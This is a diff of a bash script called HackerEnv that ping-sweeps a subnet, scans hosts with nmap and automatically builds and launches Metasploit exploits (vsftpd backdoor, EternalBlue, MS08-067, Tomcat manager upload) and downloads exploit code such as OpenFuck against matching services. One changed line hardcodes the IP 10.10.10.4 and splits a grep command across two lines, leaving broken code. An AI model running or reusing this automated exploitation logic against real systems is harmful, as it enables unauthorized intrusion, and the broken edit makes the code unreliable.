@@ -5,9 +5,7 @@
 # HackerEnv is an automation tool that quickly and easily sweep ips and scan, ports, vulnerablities and exploit them. 
 # By running this program, you are agreeing on NOT running it aginst any public, corporate or unauthorized networks. Performed only when you have authorization to do.
 
-#major.minor.patch
-#    0.X.X = beta
-VER='0.1.4'
+VER='0.1.5'
 full_path=$(realpath $0) #/opt/hackerEnv/hackerEnv.sh
 dir_path=$(dirname $full_path) #/opt/hackerEnv
 BLUE='\e[1;34m'
@@ -223,8 +221,8 @@ function terminals(){
 }
 ################################ FTP #################################
 function vsftpd_234_backdoor(){
-	echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}Backdoor command execution ${resetStyle}"
-	echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+	echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}Backdoor command execution ${resetStyle}"
+	echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 	cat <<- vsftpd_234_backdoor > ${dir_path}/exploits/ftp/vsftpd_234_backdoor.rc
 		use exploit/unix/ftp/vsftpd_234_backdoor
 		set RHOSTS ${ips}
@@ -470,8 +468,8 @@ function telnetBruteForce(){
 #	done < ${ips}/smbPass.txt
 #}
 function OpenSSH4_7p1(){
-	echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}brute force attacks against cryptographic keys ${resetStyle}"
-    echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+	echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}brute force attacks against cryptographic keys ${resetStyle}"
+    echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 	if [ ! -d ${dir_path}/exploits/ssh/rsa/ ]
 	then
 		wget -q -P ${dir_path}/exploits/ssh/ https://www.exploit-db.com/download/5632
@@ -572,18 +570,19 @@ function usermap_script(){
 	body
 }
 function ms17_010_eternalblue(){
-    smbVersion=$(grep -oP 'key="title">\K[^<]+' ${ips}/nmapSMBVuln.xml|cut -f6-7 -d' ')
+    smbVersion=$(grep -oP 'key="title">\K[^<]+' 10.10.10.4/nmapSMBVuln.xml|cut -f6-7 -d' '|grep "S"
+Microsoft SMBv1)
 	if [ "${smbVersion}" != "" ]
 	then
-		echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${smbVersion} ${resetStyle}which is ${BOLD}vulnerable${resetStyle} to ${RED}buffer overflow/remote code execution ${resetStyle}"
-		echo -e "${RED}Exploiting ${resetStyle}${BOLD}${smbVersion} ${resetStyle}is in progress"
-        cat < ms17_010_eternalblue > ${dir_path}/exploits/smb/ms17_010_eternalblue.rc
-        use exploit/windows/smb/ms17_010_eternalblue
-        set RHOSTS ${ips}
-        set LHOST ${ip}
-        spool ${ips}/notEternalBlue.txt
-        run
-        ms17_010_eternalblue
+        echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${smbVersion} ${resetStyle}which is ${BOLD}vulnerable${resetStyle} to ${RED}buffer overflow/remote code execution ${resetStyle}"
+        echo -e "${RED}Exploiting ${resetStyle}${BOLD}${smbVersion} ${resetStyle}is in progress"
+        cat <<- ms17_010_eternalblue > ${dir_path}/exploits/smb/ms17_010_eternalblue.rc
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS ${ips}
+    set LHOST ${ip}
+    spool ${ips}/notEternalBlue.txt
+    run
+ms17_010_eternalblue
         if [ "${terminal}" = "gnome-terminal" ]
         then
             gnome-terminal -q --tab -t 'eternalblue' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/ms17_010_eternalblue.rc; bash" 2> /dev/null
@@ -601,13 +600,13 @@ function ms17_010_eternalblue(){
 	notrternal=$(grep -oP '=\K[^-]+' ${ips}/notEternalBlue.txt|sed -n '/FAIL/p;1q')
 	if [ "$notEternal" = "but no session" ] || [ "$notrternal" = "FAIL" ]
 	then
-		cat < ms17_010_psexec > ${dir_path}/exploits/smb/ms17_010_psexec.rc
-        use exploit/windows/smb/ms17_010_psexec
-        set RHOSTS ${ips}
-        set LHOST ${ip}
-        spool ${ips}/EternalRomance.txt
-        run
-		ms17_010_psexec
+		cat <<- ms17_010_psexec > ${dir_path}/exploits/smb/ms17_010_psexec.rc
+    use exploit/windows/smb/ms17_010_psexec
+    set RHOSTS ${ips}
+    set LHOST ${ip}
+    spool ${ips}/EternalRomance.txt
+    run
+ms17_010_psexec
 		if [ "${terminal}" = "gnome-terminal" ]
 		then
 			gnome-terminal -q --tab -t 'eternalRomance' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/ms17_010_psexec.rc; bash" 2> /dev/null
@@ -624,12 +623,12 @@ function ms08_067_netapi(){
         smbVersion=$(grep -oP 'key="title">\K[^<]+' ${ips}/nmapSMBVuln.xml|cut -f6-7 -d' ')
         echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${smbVersion} ${resetStyle}which is ${BOLD}vulnerable${resetStyle} to ${RED}parsing flaw ${resetStyle}"
         echo -e "${RED}Exploiting ${resetStyle}${BOLD}${smbVersion} ${resetStyle}is in progress"
-        cat < ms08_067_netapi > ${dir_path}/exploits/smb/ms08_067_netapi.rc
-        use exploit/windows/smb/ms08_067_netapi
-        set RHOSTS ${ips}
-        set LHOST ${ip}
-        run
-        ms08_067_netapi
+        cat <<- ms08_067_netapi > ${dir_path}/exploits/smb/ms08_067_netapi.rc
+    use exploit/windows/smb/ms08_067_netapi
+    set RHOSTS ${ips}
+    set LHOST ${ip}
+    run
+ms08_067_netapi
         sleep 40
         if [ "${terminal}" = "gnome-terminal" ]
         then
@@ -745,13 +744,13 @@ function body(){
 		      <h2>OS type: ${ostype}</h2>
 		  </div>
 		  <div class="column" style="background-color:#2D2E30;">
-		      <h2>Service: $name</h2>
+		      <h2>Service: ${name}</h2>
 		  </div>
 		  <div class="column" style="background-color:#2D2E30;">
 		      <h2>Product: ${product}</h2>
 		  </div>
 		  <div class="column" style="background-color:#2D2E30;">
-		      <h2>Version: $version</h2>
+		      <h2>Version: ${version}</h2>
 		  </div>
 		</div>
 
@@ -867,7 +866,7 @@ header
 
 if [ "${target}" != "" ]
 then
-    for ip in ${target}
+    for ip in "$(printf ${target})"
     do
         if valid_ip ${ip}
         then
@@ -904,7 +903,7 @@ then
             fi
     esac
 fi
-echo -e "${BOLD}Performing ping sweep is in progress${resetStyle}"
+echo -e "${BOLD}Performing IP sweep is in progress${resetStyle}"
 ip a |grep -oP 'inet \K[^ ]+'| cut -f1-1 -d"/"|sed -n '2{p;q}' > ${dir_path}/urIp.txt
 ip="$(cat ${dir_path}/urIp.txt)"
 if [ "${target}" != "" ] && [ "${interface}" != "" ] && [ "${subNetwork}" != "" ]
@@ -970,22 +969,27 @@ else
 	fping -a -g ${ip}/24 2> /dev/null > ${dir_path}/online.txt
 	ips="$(cat ${dir_path}/online.txt)"
 fi
-echo -e "Your ip address is ${BOLD}${ip} ${resetStyle}"
-grep -vxFf ${dir_path}/urIp.txt ${dir_path}/online.txt > ${dir_path}/tmp.txt; cat ${dir_path}/tmp.txt > ${dir_path}/online.txt; rm ${dir_path}/tmp.txt
-while read ips
+for ip in $(cat ${dir_path}/online.txt)
 do
-	packets=$(ping -c 1 ${ips}|grep 64|cut -f1-2 -d' ')
+    packets=$(ping -c 1 ${ip}|grep 64|cut -f1-2 -d' ')
 	if [ "$packets" = "64 bytes" ]
 	then
-		echo -e "${BOLD}${ips}${resetStyle} is${BLUE} Online ${resetStyle}"
+		echo -e "${BOLD}${ip}${resetStyle} is${BLUE} Online ${resetStyle}"
 	else
-		echo -e "${BOLD}${ips}${resetStyle} is${RED} Offline ${resetStyle}"
-		sed -i "/${ips}/d" ${dir_path}/online.txt
+		echo -e "${BOLD}${ip}${resetStyle} is${RED} Offline ${resetStyle}"
 	fi
-done < ${dir_path}/online.txt
-echo "########################################"
+done
+echo "##################################"
+echo -e "Your ip address is ${BOLD}${ip} ${resetStyle}"
+grep -vxFf ${dir_path}/urIp.txt ${dir_path}/online.txt > ${dir_path}/tmp.txt; cat ${dir_path}/tmp.txt > ${dir_path}/online.txt; rm ${dir_path}/tmp.txt
 for ips in $(cat ${dir_path}/online.txt)
 do
+    packets=$(ping -c 1 ${ips}|grep 64|cut -f1-2 -d' ')
+	if [ "$packets" != "64 bytes" ]
+	then
+        sed -i "/${ips}/d" ${dir_path}/online.txt
+        continue
+	fi
 	if [ -d "${ips}" ]
 	then
 		rm -r ${ips}
@@ -1021,9 +1025,9 @@ do
 	if [ "${smbOS}" != "ERROR: Script execution failed (use -d to debug)" ] && [ "${smbOS}" != "" ]
 	then
 		echo -e "OS type: ${BLUE}${smbOS} ${resetStyle}"
-	elif [ "$ostype" != "" ]
+	elif [ "${ostype}" != "" ]
 	then
-		echo -e "OS type: ${BLUE}$ostype: $osgen ${resetStyle}"
+		echo -e "OS type: ${BLUE}${ostype}: $osgen ${resetStyle}"
 	else
 		echo -e "OS type: ${BLUE}Unknown ${resetStyle}"
 	fi
@@ -1035,41 +1039,41 @@ do
 			while read version
 			do
 ################    SSH       ###################################################################
-				if [ "$ostype" = "Linux" ] || [ "$ostype" = "linux" ]
+				if [ "${ostype}" = "Linux" ] || [ "${ostype}" = "linux" ]
 				then
-					if [ "$name" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "$version" = "2.9p2" ]
+					if [ "${name}" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "${version}" = "2.9p2" ]
 					then
 						echo "SSH"
-					elif [ "$name" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "$version" = "3.9p2" ]
+					elif [ "${name}" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "${version}" = "3.9p2" ]
 					then
 						echo "SSH"
-					elif [ "$name" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "$version" = "4.7p1 Debian 8ubuntu1" ]
+					elif [ "${name}" = "ssh" ] && [ "${product}" = "OpenSSH" ] && [ "${version}" = "4.7p1 Debian 8ubuntu1" ]
 					then
 						OpenSSH4_7p1
 					fi
-				elif [ "$ostype" = "Windows" ] || [ "$ostype" = "windows" ]
+				elif [ "${ostype}" = "Windows" ] || [ "${ostype}" = "windows" ]
 				then
-					if [ "$name" = "ssh" ] && [ "${product}" = "ssh" ] && [ "$version" = "ssh" ]
+					if [ "${name}" = "ssh" ] && [ "${product}" = "ssh" ] && [ "${version}" = "ssh" ]
 					then
 						echo "SSH"
-					elif [ "$name" = "ssh" ] && [ "${product}" = "ssh" ] && [ "$version" = "ssh" ]
+					elif [ "${name}" = "ssh" ] && [ "${product}" = "ssh" ] && [ "${version}" = "ssh" ]
 					then
 						echo "SSH"
 					fi
-				elif [ "$name" = "ssh" ]
+				elif [ "${name}" = "ssh" ]
 				then
 					sshBruteForce
 				fi
 #################    FTP       ####################################################################
-				if [ "$name" = "ftp" ] && [ "${product}" = "vsftpd" ] && [ "$version" = "2.3.4" ]
+				if [ "${name}" = "ftp" ] && [ "${product}" = "vsftpd" ] && [ "${version}" = "2.3.4" ]
 				then
 					vsftpd_234_backdoor
 				fi
 ################   apache tomcat    ################################################################
-				if [ "$name" = "http" ] && [ "${product}" = "Apache Tomcat/Coyote JSP engine" ] && [ "$version" = "1.1" ]
+				if [ "${name}" = "http" ] && [ "${product}" = "Apache Tomcat/Coyote JSP engine" ] && [ "${version}" = "1.1" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}remote code execution ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}remote code execution ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					port="$(cat ${ips}/${ips}.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
 					if [ -f ${dir_path}/exploits/apache/tomcat_mgr_login.txt ]
 					then
@@ -1078,7 +1082,7 @@ do
 					cat <<- tomcatScanner > ${dir_path}/exploits/apache/tomcat_mgr_login.rc
 						use auxiliary/scanner/http/tomcat_mgr_login
 						set RHOSTS ${ips}
-						set RPORT $port
+						set RPORT ${port}
 						spool ${dir_path}/exploits/apache/tomcat_mgr_login.txt
 						run
 						exit
@@ -1090,7 +1094,7 @@ do
 					cat <<- tomcatExploit > ${dir_path}/exploits/apache/tomcat_mgr_upload.rc
 						use exploit/multi/http/tomcat_mgr_upload
 						set RHOSTS ${ips}
-						set RPORT $port
+						set RPORT ${port}
 						set Httpusername $user
 						set Httppassword ${pass}
 						set target 0
@@ -1115,10 +1119,10 @@ do
 					fi
 				fi
 #############    apache Debian  ####################################################################
-				if [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.9" ]
+				if [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.9" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.9" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						mkdir -p ${dir_path}/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1140,10 +1144,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.19" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.19" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.19" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						mkdir -p ${dir_path}/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1165,10 +1169,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.22" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.22" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.22" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						mkdir -p ${dir_path}/exploits/{smb,ssh,ftp,apache,telnet}
@@ -1196,10 +1200,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.24" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.24" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.24" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1224,10 +1228,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.26" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.26" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.26" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1250,10 +1254,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "$version" = "1.3.27" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.27" ] && [ "${product}Openfk" = "Debian/Linux" ] && [ "${version}" = "1.3.27" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1275,10 +1279,10 @@ do
 						body
 					fi
 ##########    apache RedHat  ####################################################################
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.2.6" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.2.6" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1299,10 +1303,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.14" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.14" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.14" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.14" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1327,10 +1331,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.6.2" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "2.6.2" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/2.6.2" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "2.6.2" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1353,10 +1357,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.3" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.3" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.3" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.3" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1377,10 +1381,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.2.6" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.2.6" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1403,10 +1407,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.4" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.4" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.2.4" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.2.4" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1427,10 +1431,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.1.3" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.1.3" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.1.3" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.1.3" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
